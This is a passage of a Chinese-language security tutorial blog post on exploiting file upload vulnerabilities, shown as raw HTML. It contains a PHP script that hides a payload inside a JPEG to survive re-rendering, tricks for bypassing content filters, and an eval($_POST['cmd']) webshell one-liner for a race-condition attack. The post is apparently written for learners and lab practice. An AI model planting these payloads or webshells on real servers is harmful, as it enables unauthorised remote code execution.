                    &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, 0, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            0,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if(checkImage(&#x27;payload_&#x27;.$argv[1], $outStream)) &#123;</span><br><span class="line">                    die(&#x27;Success!&#x27;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(&#x27;payload_&#x27;.$argv[1]);</span><br><span class="line">    die(&#x27;Something\&#x27;s wrong&#x27;);</span><br><span class="line"></span><br><span class="line">    function checkImage($filename, $data, $unlink = FALSE) &#123;</span><br><span class="line">        global $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        if($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        return $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;</span><br><span class="line">        global $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = FALSE;</span><br><span class="line">        if(preg_match(&#x27;/(\d+) extraneous bytes before marker/&#x27;, $errstr, $m)) &#123;</span><br><span class="line">            if(isset($m[1])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[1];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class DataInputStream &#123;</span><br><span class="line">        private $binData;</span><br><span class="line">        private $order;</span><br><span class="line">        private $size;</span><br><span class="line"></span><br><span class="line">        public function __construct($filename, $order = false, $fromString = false) &#123;</span><br><span class="line">            $this-&gt;binData = &#x27;&#x27;;</span><br><span class="line">            $this-&gt;order = $order;</span><br><span class="line">            if(!$fromString) &#123;</span><br><span class="line">                if(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    die(&#x27;File not exists [&#x27;.$filename.&#x27;]&#x27;);</span><br><span class="line">                $this-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            $this-&gt;size = strlen($this-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function seek() &#123;</span><br><span class="line">            return ($this-&gt;size - strlen($this-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function skip($skip) &#123;</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readByte() &#123;</span><br><span class="line">            if($this-&gt;eof()) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr($this-&gt;binData, 0, 1);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 1);</span><br><span class="line">            return ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function readShort() &#123;</span><br><span class="line">            if(strlen($this-&gt;binData) &lt; 2) &#123;</span><br><span class="line">                die(&#x27;End Of File&#x27;);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr($this-&gt;binData, 0, 2);</span><br><span class="line">            $this-&gt;binData = substr($this-&gt;binData, 2);</span><br><span class="line">            if($this-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);</span><br><span class="line">            &#125;</span><br><span class="line">            return $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function eof() &#123;</span><br><span class="line">            return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li>随便找一个jpg图片，先上传至服务器然后再下载到本地保存为 1.jpg ；（可选）</li>
<li>插入php代码；使用脚本处理1.jpg，命令：<code>php jpg_payload.php 1.jpg</code></li>
</ol>
<h4 id="过滤字母和数字"><a href="#过滤字母和数字" class="headerlink" title="过滤字母和数字"></a>过滤字母和数字</h4><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
<h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤 []"></a>过滤 <code>[]</code></h4><p>使用 <code>array_pop</code>, 或者大括号 <code>&#123;&#125;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array_pop($_GET) //相当于$_GET[&#x27;第一个参数名&#x27;]</span><br><span class="line">$_GET&#123;&#x27;cmd&#x27;&#125;     //相当于$_GET[&#x27;cmd&#x27;]</span><br></pre></td></tr></table></figure>

<h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤 ;"></a>过滤 <code>;</code></h4><p>一段php脚本的最后一个语句，可以使用 <code>?&gt;</code> 作为语句结束标志。如果有多条语句，可以分成多个脚本后上传：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=1</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">echo $a</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="过滤-lt-php"><a href="#过滤-lt-php" class="headerlink" title="过滤 &lt;?php"></a>过滤 <code>&lt;?php</code></h4><p>使用 <code>&lt;? echo &#39;123&#39;;?&gt;</code> 写法，需要配置参数 short_open_tags&#x3D;on</p>
<p>还可以使用这种写法 <code>&lt;% echo &#39;123&#39;;%&gt;</code> ，需要配置参数 asp_tags&#x3D;on</p>
<p>用 <code>&lt;?=(表达式)?&gt;</code> ，等价于 <code>&lt;?php echo (表达式)?&gt;</code>，不需要配置参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`cat fla*`?&gt; 等价于 &lt;?php echo `cat fla*`?&gt;</span><br></pre></td></tr></table></figure>

<p>还可以使用html标签，但是只能在7.0以下使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=”php”&gt;echo &#x27;123&#x27;; &lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>在一些上传场景中，上传的文件上传成功后会被立马删除，导致无法访问上传的文件。所以从上传成功到被删除的这段时间大概（几百ms）存在一个空档，我们利用这段空档可以访问到上传的文件。所以可以通过不断的上传文件，并不断的访问到达目的。</p>
<p>为了更好的效果，可以写文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&#x27;eval.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;])?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>

<p>然后使用Intruder重发，直到成功写入文件</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8267#toc-20">https://xz.aliyun.com/t/8267#toc-20</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/328227.html">https://www.freebuf.com/vuls/328227.html</a></p>
<p><a target="_blank" rel="noopener" href="https://tatsumaki.cn/2020/07/29/00jieduan/">https://tatsumaki.cn/2020/07/29/00jieduan/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.fujieace.com/penetration-test/upload-labs-pass-16.html">https://www.fujieace.com/penetration-test/upload-labs-pass-16.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.twblogs.net/a/610e888e1cf175147a0e7f96">https://www.twblogs.net/a/610e888e1cf175147a0e7f96</a></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/configuration.file.per-user.php">https://www.php.net</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/328241.html">https://www.freebuf.com/articles/web/328241.html</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://blog.tawnx.com">Tawnx</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://blog.tawnx.com/2022/08/09/Upload/">http://blog.tawnx.com/2022/08/09/Upload/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/Security/">Security</a><a class="post-meta__tags" href="/tags/Upload/">Upload</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/08/20/XSS/" title="XSS（跨站脚本攻击）"><img class="cover" src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-19-下午10.17.36.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">XSS（跨站脚本攻击）</div></div></a></div><div class="next-post pull-right"><a href="/2022/08/06/CSRF/" title="CSRF（跨站请求伪造）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">CSRF（跨站请求伪造）</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/07/25/SSTI/" title="SSTI（服务端模版注入）"><img class="cover" src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-24-下午7.44.53.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-25</div><div class="title">SSTI（服务端模版注入）</div></div></a></div><div><a href="/2022/04/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="PHP反序列化"><img class="cover" src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-05/未命名-2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-14</div><div class="title">PHP反序列化</div></div></a></div><div><a href="/2022/08/20/XSS/" title="XSS（跨站脚本攻击）"><img class="cover" src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-19-下午10.17.36.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-20</div><div class="title">XSS（跨站脚本攻击）</div></div></a></div><div><a href="/2022/08/06/CSRF/" title="CSRF（跨站请求伪造）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-06</div><div class="title">CSRF（跨站请求伪造）</div></div></a></div><div><a href="/2022/03/22/%E6%9C%80%E8%BF%91%E4%BD%BF%E7%94%A8hashcat%E9%81%87%E5%88%B0%E7%9A%84%E5%90%84%E7%A7%8D%E9%97%AE%E9%A2%98/" title="最近使用hashcat遇到的各种问题"><img class="cover" src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-03/截屏2022-03-22-20.57.13.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-22</div><div class="title">最近使用hashcat遇到的各种问题</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tawnx</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Upload%EF%BC%88%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">Upload（文件上传漏洞）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-user-ini%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">通过.user.ini包含文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-htaccess"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用.htaccess</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%96%B9%E6%B3%95%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.</span> <span class="toc-text">过滤方法及其绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF%E6%A3%80%E6%B5%8B"><span class="toc-number">1.3.1.</span> <span class="toc-text">前端检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MIME-type-%E6%A3%80%E6%B5%8B"><span class="toc-number">1.3.2.</span> <span class="toc-text">MIME type 检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E6%A3%80%E6%B5%8B"><span class="toc-number">1.3.3.</span> <span class="toc-text">文件名检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%85%B6%E4%BB%96%E5%8F%AF%E8%A7%A3%E6%9E%90%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">使用其他可解析文件名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A80x00%E6%88%AA%E6%96%AD"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">使用0x00截断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-DATA"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">利用::$DATA</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.3.4.</span> <span class="toc-text">利用漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%B5%8B"><span class="toc-number">1.3.4.</span> <span class="toc-text">文件头检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B"><span class="toc-number">1.3.5.</span> <span class="toc-text">文件内容检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">二次渲染</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">过滤字母和数字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.5.3.</span> <span class="toc-text">过滤 []</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-1"><span class="toc-number">1.3.5.4.</span> <span class="toc-text">过滤 ;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-lt-php"><span class="toc-number">1.3.5.5.</span> <span class="toc-text">过滤 &lt;?php</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.3.6.</span> <span class="toc-text">条件竞争</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">1.4.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/12/20/Python%E4%BB%A3%E7%A0%81%E6%89%93%E5%8C%85exe/" title="Python代码打包exe">Python代码打包exe</a><time datetime="2022-12-20T11:50:38.000Z" title="Created 2022-12-20 19:50:38">2022-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/08/20/XSS/" title="XSS（跨站脚本攻击）"><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-19-下午10.17.36.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS（跨站脚本攻击）"/></a><div class="content"><a class="title" href="/2022/08/20/XSS/" title="XSS（跨站脚本攻击）">XSS（跨站脚本攻击）</a><time datetime="2022-08-20T11:50:38.000Z" title="Created 2022-08-20 19:50:38">2022-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/08/09/Upload/" title="Upload（文件上传漏洞）">Upload（文件上传漏洞）</a><time datetime="2022-08-09T09:14:38.000Z" title="Created 2022-08-09 17:14:38">2022-08-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/08/06/CSRF/" title="CSRF（跨站请求伪造）">CSRF（跨站请求伪造）</a><time datetime="2022-08-06T07:50:38.000Z" title="Created 2022-08-06 15:50:38">2022-08-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/07/25/SSTI/" title="SSTI（服务端模版注入）"><img src="https://image-bed-0.oss-cn-hongkong.aliyuncs.com/2022-07/截屏2022-07-24-下午7.44.53.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSTI（服务端模版注入）"/></a><div class="content"><a class="title" href="/2022/07/25/SSTI/" title="SSTI（服务端模版注入）">SSTI（服务端模版注入）</a><time datetime="2022-07-25T13:03:38.000Z" title="Created 2022-07-25 21:03:38">2022-07-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Tawnx</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>